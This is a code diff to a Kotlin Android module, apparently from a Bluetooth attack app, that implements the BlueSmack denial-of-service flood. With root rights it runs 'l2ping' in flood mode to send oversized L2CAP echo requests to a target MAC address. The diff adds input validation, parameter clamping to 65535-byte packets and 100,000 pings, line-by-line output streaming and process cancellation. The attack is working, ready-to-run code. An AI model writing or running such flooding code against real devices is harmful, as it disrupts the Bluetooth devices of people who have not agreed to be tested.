@@ -4,68 +4,96 @@ import android.util.Log
 import com.hereliesaz.blusnu.utils.MacValidator
 import com.hereliesaz.blusnu.utils.RootExecutor
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.currentCoroutineContext
+import kotlinx.coroutines.ensureActive
 import kotlinx.coroutines.flow.Flow
 import kotlinx.coroutines.flow.flow
 import kotlinx.coroutines.withContext
 import java.io.BufferedReader
 import java.io.InputStreamReader
+import kotlin.coroutines.cancellation.CancellationException
 
 /**
- * Module responsible for the BlueSmack Denial of Service (DoS) attack.
+ * Executes the BlueSmack L2CAP ping flood via the system l2ping binary.
  *
- * BlueSmack sends oversized L2CAP Echo Request packets (l2ping) to the target,
- * which can cause buffer overflows in legacy or poorly implemented Bluetooth stacks.
- *
- * Root is required because l2ping uses raw L2CAP sockets, which are privileged on Android.
- * The attack is executed via the system's l2ping binary through [RootExecutor].
+ * Root is required because l2ping uses raw L2CAP sockets on Android.
  */
 class BlueSmackModule {
 
     companion object {
         private const val TAG = "BlueSmackModule"
+
+        /** Regex for validating HCI interface names (e.g. hci0, hci1). */
+        private val INTERFACE_REGEX = Regex("^[a-zA-Z0-9]+$")
+
+        /** Valid range for L2CAP echo-request payload size in bytes. */
+        val PACKET_SIZE_RANGE = 1..65535
+
+        /** Valid range for ping count. */
+        val PACKET_COUNT_RANGE = 1..100_000
+
+        /**
+         * Validates that [interfaceName] is safe for shell interpolation.
+         *
+         * @throws IllegalArgumentException if the name contains characters outside `[a-zA-Z0-9]`.
+         */
+        fun requireValidInterface(interfaceName: String) {
+            require(INTERFACE_REGEX.matches(interfaceName)) {
+                "Invalid interface name: '$interfaceName'. Must match [a-zA-Z0-9]+."
+            }
+        }
+
+        /**
+         * Clamps [size] into [PACKET_SIZE_RANGE] and [count] into [PACKET_COUNT_RANGE].
+         *
+         * @return Pair of (clampedSize, clampedCount).
+         */
+        fun clampParameters(size: Int, count: Int): Pair<Int, Int> =
+            size.coerceIn(PACKET_SIZE_RANGE) to count.coerceIn(PACKET_COUNT_RANGE)
     }
+
+    /** Reference to the active su process, if any. Volatile for cross-thread visibility. */
+    @Volatile
+    private var activeProcess: Process? = null
 
     /**
      * Checks if root access is available on this device.
-     *
-     * @return true if a root shell reports uid=0.
      */
     suspend fun checkRoot(): Boolean {
         return RootExecutor.isRootAvailable()
     }
 
     /**
-     * Starts the BlueSmack DoS attack by executing l2ping with oversized packets.
+     * Starts the BlueSmack attack, emitting l2ping output line-by-line as a [Flow].
      *
-     * The attack sends [count] L2CAP Echo Request packets of [packetSize] bytes to the
-     * target device. Each response line from l2ping is emitted as a flow event.
-     *
-     * @param targetMac The Bluetooth MAC address of the target (e.g. "AA:BB:CC:DD:EE:FF").
-     * @param packetSize The payload size in bytes for each ping (default 600, max depends on stack).
-     * @param count The number of pings to send (default 1000).
-     * @return A Flow of strings with each l2ping output line or error messages.
+     * @param targetMac     Bluetooth MAC address (e.g. "AA:BB:CC:DD:EE:FF").
+     * @param packetSize    Payload size in bytes (clamped to [PACKET_SIZE_RANGE]).
+     * @param count         Number of pings (clamped to [PACKET_COUNT_RANGE]).
+     * @param interfaceName HCI interface to use (e.g. "hci0"). Validated against [INTERFACE_REGEX].
      */
     fun startAttack(
         targetMac: String,
         packetSize: Int = 600,
-        count: Int = 1000
+        count: Int = 1000,
+        interfaceName: String = "hci0"
     ): Flow<String> = flow {
-        emit("BlueSmack DoS: targeting $targetMac with $count packets of $packetSize bytes")
+        MacValidator.requireValid(targetMac)
+        requireValidInterface(interfaceName)
+        val (clampedSize, clampedCount) = clampParameters(packetSize, count)
 
-        // Verify root access
+        emit("BlueSmack DoS: targeting $targetMac with $clampedCount packets of $clampedSize bytes on $interfaceName")
+
         if (!checkRoot()) {
             emit("ERROR: Root access is not available. BlueSmack requires root for raw L2CAP sockets.")
             return@flow
         }
         emit("Root access confirmed.")
 
-        // Check if l2ping binary exists
         val whichResult = RootExecutor.execute("which l2ping")
         val l2pingAvailable = !whichResult.startsWith("Error") && whichResult.isNotBlank()
 
         if (!l2pingAvailable) {
             emit("WARNING: l2ping binary not found in PATH.")
-            // Try alternative check to see if hcitool is at least present
             val hcitoolCheck = RootExecutor.execute("which hcitool")
             if (!hcitoolCheck.startsWith("Error") && hcitoolCheck.isNotBlank()) {
                 emit("hcitool found at: ${hcitoolCheck.trim()}")
@@ -80,65 +108,77 @@ class BlueSmackModule {
         }
         emit("l2ping binary found at: ${whichResult.trim()}")
 
-        // Execute l2ping via a streaming root shell so we can emit output line by line
-        emit("Launching: l2ping -i hci0 -s $packetSize -c $count -f $targetMac")
-        val output = executel2ping(targetMac, packetSize, count)
-        for (line in output) {
-            emit(line)
-        }
+        val cmd = "l2ping -i $interfaceName -s $clampedSize -c $clampedCount -f $targetMac"
+        emit("Launching: $cmd")
+
+        executeL2ping(cmd) { line -> emit(line) }
+
         emit("BlueSmack attack completed.")
     }
 
     /**
-     * Executes l2ping in a root shell and collects output lines.
+     * Runs [command] inside a root shell, streaming stdout/stderr line-by-line via [onLine].
      *
-     * We run the command through a root process and read stdout/stderr line by line.
-     * This captures both the per-ping responses ("XX bytes from ... time=XXms") and
-     * any error output.
+     * The su [Process] reference is stored in [activeProcess] so that [destroyProcess] can
+     * tear it down from another thread (e.g. on stop or ViewModel clear).
      */
-    private suspend fun executel2ping(
-        targetMac: String,
-        packetSize: Int,
-        count: Int
-    ): List<String> = withContext(Dispatchers.IO) {
-        MacValidator.requireValid(targetMac)
-        val lines = mutableListOf<String>()
+    suspend fun executeL2ping(
+        command: String,
+        onLine: suspend (String) -> Unit
+    ) = withContext(Dispatchers.IO) {
+        var process: Process? = null
         try {
-            val process = Runtime.getRuntime().exec("su")
+            process = Runtime.getRuntime().exec("su")
+            activeProcess = process
+
             val os = process.outputStream
             val reader = BufferedReader(InputStreamReader(process.inputStream))
             val errReader = BufferedReader(InputStreamReader(process.errorStream))
 
-            os.write("l2ping -i hci0 -s $packetSize -c $count -f $targetMac\n".toByteArray())
+            os.write("$command\n".toByteArray())
             os.write("exit\n".toByteArray())
             os.flush()
             os.close()
 
-            // Read stdout line by line
+            // Stream stdout line-by-line so the UI updates in real time
             var line: String?
             while (reader.readLine().also { line = it } != null) {
+                currentCoroutineContext().ensureActive()
                 line?.let {
-                    lines.add(it)
                     Log.d(TAG, "l2ping: $it")
+                    onLine(it)
                 }
             }
 
-            // Read any stderr
+            // Drain stderr
             while (errReader.readLine().also { line = it } != null) {
+                currentCoroutineContext().ensureActive()
                 line?.let {
-                    lines.add("stderr: $it")
                     Log.w(TAG, "l2ping stderr: $it")
+                    onLine("stderr: $it")
                 }
             }
 
             val exitCode = process.waitFor()
             if (exitCode != 0) {
-                lines.add("l2ping exited with code $exitCode")
+                onLine("l2ping exited with code $exitCode")
             }
+        } catch (e: CancellationException) {
+            throw e
         } catch (e: Exception) {
             Log.e(TAG, "Failed to execute l2ping", e)
-            lines.add("ERROR: ${e.message ?: "Unknown error executing l2ping"}")
+            onLine("ERROR: ${e.message ?: "Unknown error executing l2ping"}")
+        } finally {
+            process?.destroyForcibly()
+            activeProcess = null
         }
-        lines
+    }
+
+    /**
+     * Forcibly destroys the active su process, if any. Safe to call from any thread.
+     */
+    fun destroyProcess() {
+        activeProcess?.destroyForcibly()
+        activeProcess = null
     }
 }
